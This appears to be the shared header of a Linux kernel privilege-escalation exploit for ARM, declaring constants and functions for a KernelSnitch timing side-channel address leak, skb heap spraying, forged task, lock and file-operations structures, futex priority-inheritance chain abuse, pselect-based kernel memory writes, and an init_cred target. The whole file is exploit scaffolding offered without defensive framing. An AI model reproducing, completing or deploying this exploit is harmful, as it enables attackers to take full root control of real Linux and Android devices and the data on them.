#ifndef COMMON_H
#define COMMON_H

#define _GNU_SOURCE
#define __ARM 1

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_SIZE 4096
#define KS_PAGE_MASK 0xfffULL

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/memfd.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"
#include "target.h"

#define KERNEL_PAGE_SETUP_ATTEMPTS 6
#define SKB_DATA_DELTA (-0xe80LL)
#define MM_STRUCT_SZ_DEFAULT 0x500

/* mm_struct stride; 0 uses MM_STRUCT_SZ above. */
#define mm_struct_sz()                                                        \
  (MM_STRUCT_SZ                                                               \
       ? MM_STRUCT_SZ                                         \
       : MM_STRUCT_SZ_DEFAULT)

#define MM_ORDER 3
#define MM_PARTIALS 5
extern int g_core_main;
extern int g_core_consumer;
#define CORE (g_core_main)
#define CONSUMER_CORE (g_core_consumer)
#define KSNITCH_COLLISIONS 4

#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#define SKB_RECLAIM_SENDS 4
#define FOPS_TABLE_OFF FOPS_OFF
#define SKB_FRAG_BIAS 0

#define FAKE_TASK_PRIO 120
#define FAKE_WAITER_PRIO 140
#define FAKE_TASK_UCLAMP_REQ_OFF 0x350
#define FAKE_TASK_UCLAMP_OFF 0x358
#define FAKE_UCLAMP_ACTIVE_BIT 16
#define FAKE_UCLAMP_MIN_ACTIVE (1U << FAKE_UCLAMP_ACTIVE_BIT)
#define FAKE_UCLAMP_MAX_ACTIVE \
  (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT))

#define TASK_COMM_LEN 16

#define P0_KERNEL_PHYS_DELTA (p0_kernel_phys_load - P0_PHYS_OFFSET)
#define P0_DATA_ALIAS_CONST(image_addr) \
  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))

#define CONSUMER_MAX_CALLS 1
#define PSELECT_ROUTE_NFDS 320
#define PSELECT_CONSUMER_NICE 19
#define PSELECT_CONSUMER_BURST_CALLS 1
#define PSELECT_CONSUMER_SETTLE_USEC 250000
#define PSELECT_ENTER_DELAY_USEC 50000
/* select() timeout defaults; the compact route overrides both. */
#ifndef PSELECT_TIMEOUT_SEC
#define PSELECT_TIMEOUT_SEC 0
#endif
#ifndef PSELECT_TIMEOUT_USEC
#define PSELECT_TIMEOUT_USEC 200000
#endif
#ifndef ROUTE_WAIT_SECONDS
#define ROUTE_WAIT_SECONDS 1
#endif
#define SLIDE_INIT_TASK data_addr(SLIDE_INIT_TASK_IMAGE)
#define SLIDE_ROOT_TASK_GROUP \
  data_addr(SLIDE_ROOT_TASK_GROUP_IMAGE)

struct kernelsnitch_shared_state;

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};

extern uintptr_t page_base;
extern uintptr_t last_mm_struct;
extern uintptr_t fake_lock;
extern uintptr_t fake_w0;
extern uintptr_t fake_task;
extern uintptr_t fake_parent;
extern uintptr_t fake_right;
extern uintptr_t fake_left;
extern uintptr_t fake_fops;
extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;

extern uint32_t f_wait;
extern uint32_t f_pi_target;
extern uint32_t f_pi_chain;
extern atomic_int waiter_ready;
extern atomic_int waiter_waiting;
extern atomic_int owner_started;
extern atomic_int owner_chain_done;
extern atomic_int route_done;
extern atomic_int waiter_tid;
extern atomic_int punch_consume_go;
extern atomic_int punch_consume_stop;
extern atomic_int consumer_calls;
extern atomic_int consumer_success;
extern atomic_int consumer_inflight;
extern atomic_int main_route_delay_usec;
extern int route_last_step;
extern int route_last_errno;
extern int memfd_leak;

int run_exploit(int argc, char **argv);
void read_first_line(const char *path, char *buf, size_t len);
void log_startup_context(void);
void init_cpu_config(void);
void disable_rseq_for_thread(void);
void init_p0_profile(void);
extern uint64_t p0_kernel_phys_load;
extern uintptr_t g_init_cred_image;
struct kernel_offsets;
long futex_op(
    uint32_t *uaddr, int op, uint32_t val,
    const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
long sched_setattr_tid(int tid, int nice_value);
uintptr_t p0_data_alias(uintptr_t image_addr);
uintptr_t data_addr(uintptr_t image_addr);
void clear_pselect_write(void);
void put64(unsigned char *p, size_t off, uint64_t value);
void put32(unsigned char *p, size_t off, uint32_t value);
pid_t clone_child(void);
pid_t clone_leak_child(void);
int open_memfd(pid_t child);
void kill_child(pid_t child);
void close_reclaim_sockets(void);
void setup_kernelsnitch(void);
int kernelsnitch_collisions_ready(void);
void run_kernelsnitch_bruteforce(void);
uintptr_t current_kernelsnitch_mm_struct(void);
uintptr_t cleanup_kernelsnitch(void);
void close_ctx_memfds(struct mm_ctx *ctx);
void free_ctx_storage(struct mm_ctx *ctx);
void cleanup_page_prepare_state(void);
int clone_memfd(void);
void prepare_ctxs(void);
int prepare_skb_payload(uintptr_t base);
uintptr_t prepare_kernel_page(void);
uintptr_t prepare_good_kernel_page(void);

void fdset_put_word(fd_set *set, int word, uint64_t value);
uint64_t fdset_get_word(const fd_set *set, int word);
int tcp_route_selected(void);
void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
void do_pselect_fake_lock_route(void);
void do_tcp_fake_lock_route(void);
void reset_main_route_state(void);
int run_main_route_threads(void);
void set_pselect_write_mode(uintptr_t target, int mode);

#endif
